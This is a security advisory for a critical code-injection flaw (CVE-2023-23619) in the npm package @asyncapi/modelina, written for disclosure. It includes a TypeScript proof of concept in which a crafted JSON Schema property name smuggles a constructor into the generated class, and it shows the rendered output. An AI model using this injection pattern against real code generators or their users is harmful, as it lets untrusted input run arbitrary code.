# [C] Improper Control of Generation of Code ('Code Injection') in @asyncapi/modelina

## Summary
Severity: Critical
Advisory: GHSA-4jg2-84c2-pj95
CVE: CVE-2023-23619
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2021-09-21
Source: https://github.com/advisories/GHSA-4jg2-84c2-pj95
Type: github-advisory

## Affected
- npm: `@asyncapi/modelina` — affected >=0 <1.0.0

## Details
### Impact
Anyone who is using the default presets and/or does not handle the functionality themself.

### Patches
It is impossible to fully guard against this, because users have access to the original raw information. However, as of version 1, if you only access the constrained models, you will not encounter this issue.

Further similar situations are NOT seen as a security issue, but intended behavior.

### Workarounds
Fully custom presets that change the entire rendering process which can then escape the user input.

### For more information
Even though that I changed all the presets here, the vulnerability is still present throughout. I am using a JSON Schema here for simplicity.
```ts
const jsonSchemaDoc = {
  $id: 'CustomClass',
  type: 'object',
  properties: {
      'property: any; \n constructor(){console.log("injected")} \n private _temp': { type: 'string' },
  }
};
generator = new TypeScriptGenerator(
  { 
    presets: [
      {
        class: {
            property({ propertyName, content }) {
              return `private ${propertyName}: any;`;
            },
            ctor() {
              return '';
            },
            getter() {
              return '';
            },
            setter() {
              return '';
            }
        }
      }
    ]
  }
);
const inputModel = await generator.process(jsonSchemaDoc);
```
This would render
```ts
export class CustomClass {
  private property: any; 
   constructor(){console.log("injected")} 
   private _temp: any;
  private additionalProperties: any;
}
```

## References
- https://github.com/asyncapi/modelina/security/advisories/GHSA-4jg2-84c2-pj95
- https://nvd.nist.gov/vuln/detail/CVE-2023-23619
- https://github.com/asyncapi/modelina
